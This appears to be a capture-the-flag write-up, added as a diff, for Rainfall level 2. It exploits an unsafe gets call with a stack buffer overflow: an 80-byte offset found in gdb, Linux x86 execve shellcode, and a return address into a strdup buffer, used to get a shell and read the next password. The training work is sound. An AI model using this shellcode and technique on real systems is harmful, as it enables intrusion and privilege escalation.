@@ -1,0 +1,59 @@
+# Rainfall - Level2 Walkthrough
+
+A single binary is present in `/home/user/level2`. Listing it shows it is owned by `level2`. Copy it locally for analysis:
+
+```bash
+scp -P 4242 level2@{IP}:/home/user/level2/level2 .
+```
+
+**Step 1**  
+Open the binary in Ghidra.
+
+**Step 2**  
+Locate the `main` function. It's calling p(). Go into p() and see what it does. It has a `gets` call.
+
+**Step 3**
+We know `gets` like in the level1 is unsafe. So we try to find the offset to overwrite the return address. We can use gdb to help us find it.
+
+```bash
+(gdb) run <<< $(python -c "print 'A'*80")
+(gdb) info registers
+ebp            0x41414141       0x41414141
+eip            0xb7ea912f       0xb7ea912f
+```
+
+So we see that EIP is not overwritten yet. We try with 84 bytes.
+
+```bash
+(gdb) run <<< $(python -c "print 'A'*80 + 'B'*4")
+(gdb) info registers
+ebp            0x41414141       0x41414141
+eip            0x42424242       0x42424242
+```
+
+So we know the offset is 80 bytes. And the 4 bytes after that overwrite the return address.
+
+**Step 4**
+Unlike the level1, there is no function that spawns a shell. So we need to find another way to get a shell. The way is creating a shellcode and injecting it into the buffer with strdup. And then overwrite the return address to point to the buffer.
+
+The shellcode to spawn a shell in Linux x86, source https://www.exploit-db.com/exploits/46907 :
+
+"\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+So the payload is going to be padding + shellcode + return address.
+we can find the strdup buffer address by doing this :
+
+```bash
+echo "test" | ltrace ./level2
+strdup("test") = 0x0804a008
+```
+
+**step 5**
+Create the payload and run the binary with it.
+
+```bash
+python -c "print '\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A'*59 + '\x08\xa0\x04\x08'" > /tmp/payload
+cat /tmp/payload - | ./level2
+```
+
+Use that shell to read `/home/user/level2/.pass`.
